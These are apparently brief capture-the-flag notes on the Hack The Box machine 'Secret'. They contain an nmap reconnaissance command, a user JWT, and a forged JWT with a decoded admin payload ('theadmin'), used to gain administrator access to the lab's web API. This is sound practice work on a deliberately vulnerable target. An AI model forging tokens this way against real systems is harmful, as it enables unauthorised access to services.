[Secret](https://app.hackthebox.com/machines/Secret)

`nmap -sC -sV --top-ports 1000 $MACHINE -o nmap-top-ports` results in `nmap-top-ports`

JWT token:
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWNiNzU3NTliMmEwYjA0NjExZDcxYzAiLCJuYW1lIjoidGFkZXV1c3oiLCJlbWFpbCI6InRhZGV1c3pAdGFkZXVzei5wbCIsImlhdCI6MTY0MDcyMzk2N30.eUokT5hAHeEdeuYDCtCFgKMB2FsWXyF_dOLS03IoSqg`

Admin:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQwNzIzOTY3fQ.IbVQm1Jv-fxUblfuqE_dNSxKFf3H-7KexQFT9T7gxlc

{
  "_id": "6114654d77f9a54e00f05777",
  "name": "theadmin",
  "email": "root@dasith.works",
  "iat": 1640723967
}